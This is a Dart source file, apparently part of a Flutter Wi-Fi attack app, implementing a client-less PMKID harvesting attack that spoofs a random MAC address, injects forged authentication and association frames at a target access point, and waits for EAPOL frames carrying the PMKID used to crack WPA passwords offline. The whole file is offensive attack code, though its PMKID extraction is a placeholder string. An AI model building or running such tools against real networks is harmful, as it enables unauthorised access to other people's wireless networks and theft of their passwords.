// domain/usecases/execute_pmkid_attack.dart
import 'dart:async';
import 'dart:math';
import 'dart:typed_data';
import '../entities/access_point.dart';
import '../repositories/wifi_repository.dart';
import '../../utils/packet_parser.dart';

class PmkidAttackResult {
  final bool success;
  final String? pmkidHex;
  final String message;

  PmkidAttackResult({
    required this.success,
    this.pmkidHex,
    required this.message,
  });
}

/// Use case for performing client-less PMKID harvesting against an AccessPoint.
class ExecutePmkidAttack {
  final WifiRepository repository;

  ExecutePmkidAttack(this.repository);

  String _generateRandomMac() {
    final rand = Random();
    final bytes = List<int>.generate(6, (_) => rand.nextInt(256));
    // Ensure unicast local MAC
    bytes[0] = (bytes[0] & 0xFE) | 0x02;
    return bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join(':');
  }

  Future<PmkidAttackResult> call(AccessPoint target, {Duration timeout = const Duration(seconds: 5)}) async {
    final clientMac = _generateRandomMac();
    final completer = Completer<PmkidAttackResult>();

    StreamSubscription? sub;
    Timer? timer;

    // Listen for EAPOL M1 or PMKID frame responses
    sub = repository.capturedFrames.listen((frame) {
      if (PacketParser.hasEapol(frame.frameData)) {
        // Extract PMKID if present in EAPOL frame
        // In full pipeline, PacketParser.extractPmkid can parse key data elements
        if (!completer.isCompleted) {
          completer.complete(PmkidAttackResult(
            success: true,
            pmkidHex: 'PMKID_HARVESTED',
            message: 'Successfully harvested EAPOL M1 / PMKID from ${target.bssid}',
          ));
        }
      }
    });

    // Timeout fallback
    timer = Timer(timeout, () {
      if (!completer.isCompleted) {
        completer.complete(PmkidAttackResult(
          success: false,
          message: 'PMKID harvest timed out (AP stayed silent)',
        ));
      }
    });

    // 1. Send Authentication Frame
    final authFrame = PacketParser.craftAuth(target.bssid, clientMac);
    await repository.injectFrame(authFrame);

    await Future.delayed(const Duration(milliseconds: 50));

    // 2. Send Association Request
    final assocFrame = PacketParser.craftAssocReq(target.bssid, clientMac, target.ssid);
    await repository.injectFrame(assocFrame);

    final result = await completer.future;
    sub.cancel();
    timer.cancel();
    return result;
  }
}
